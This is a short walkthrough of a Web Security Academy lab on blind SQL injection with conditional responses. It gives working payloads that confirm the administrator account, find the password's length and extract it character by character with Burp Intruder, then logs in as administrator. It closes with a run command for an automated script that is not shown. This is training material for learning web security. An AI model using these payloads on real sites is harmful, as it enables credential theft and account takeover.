# SQL Injection Lab 11 - Blind SQL injection with conditional responses

## Manual Solution

### 1. Access the lab in Web Security Academy

### 2. Initial Setup:
   - Open Burp Suite and intercept a GET request to the website
   - Send the captured request to Repeater for testing

### 3. Verify SQL Injection Vulnerability:
   - Add trackingID parameter: `' and 1=1 --` 
   - Confirm vulnerability by observing "welcome back" message in response

### 4. Confirm Administrator User Exists:
   - Payload: `' and 'administrator' = (SELECT username FROM users WHERE username = 'administrator') --`
   - Verify existence by checking for "welcome back" message

### 5. Determine Password Length:
   - Initial payload: `' and (SELECT LENGTH(password) FROM users WHERE username = 'administrator') <= 1--`
   - Use Intruder with:
     * Payload position: `1`
     * Payload type: Numbers (1-60)
   - Password length is identified where response lengths change
   
### 6. Extract Password Characters:
   - Base payload: `' and (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator') = 'a'--`
   - Configure Intruder:
     * First position: `SUBSTRING(password,[position],1)`
       - Payload type: Numbers (1 to password length)
     * Second position: Character to test
       - Payload type: Brute forcer (a-z, 0-9)
   - Identify correct characters by analyzing response lengths

### 7. Login:
   - Use extracted password to login as administrator
   - Verify successful access to admin account

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command: python sqli_lab_11.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
